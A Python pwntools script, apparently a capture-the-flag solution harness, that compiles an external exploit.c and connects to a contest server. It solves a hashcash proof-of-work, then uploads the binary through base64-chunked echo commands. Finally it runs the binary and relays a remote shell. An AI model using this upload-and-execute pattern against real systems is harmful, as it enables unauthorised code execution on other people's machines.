import base64
from subprocess import check_output, run
from more_itertools import chunked
from pwn import *

SRC_PATH = "exploit.c"
BIN_PATH = "exploit"

print("[+] compiling...")
run(f"musl-gcc -static {SRC_PATH} -o {BIN_PATH}", shell=True)
bin_b64 = base64.b64encode(open(BIN_PATH, "rb").read())
print("[+] compiled.")

assert b"\n" not in bin_b64

sock = remote("keasy.finals.m0lecon.it", 15011)

sock.recvuntil(b"hashcash -mb28 ")
hashcash_challenge = sock.recvline(keepends=False).strip().decode()
print(f'[-] {hashcash_challenge=}')

cmd = "hashcash -mb28 " + hashcash_challenge
hashcash_res = check_output(cmd, shell=True).strip()

print(f'[-] {hashcash_res=}')
sock.sendline(hashcash_res)

def truncate(s: str):
    if len(s) <= 10: return s
    return f'{s[:10]}...'

def recv_output(out=False):
    res = sock.recvuntil("$ ".encode(), drop=True).strip().replace(b"\r", b"")
    if out: print(res.decode())
    return res

def exec_cmd(cmd: bytes):
    recv_output()
    print(f'[+] exec_cmd("{truncate(cmd.decode())}")')
    sock.sendline(cmd)

for chunk in chunked(bin_b64, 1000):
    exec_cmd(f"echo {bytes(chunk).decode()} >> exploit.b64".encode())

exec_cmd(f"base64 -d < exploit.b64 > exploit".encode())
exec_cmd(f"chmod 755 exploit".encode())
exec_cmd(f"./exploit".encode())

while True:
    print(sock.recvline().strip().decode())

while True:
    sock.sendline(input("$ ").encode())
    recv_output(True)
# sock.interactive()
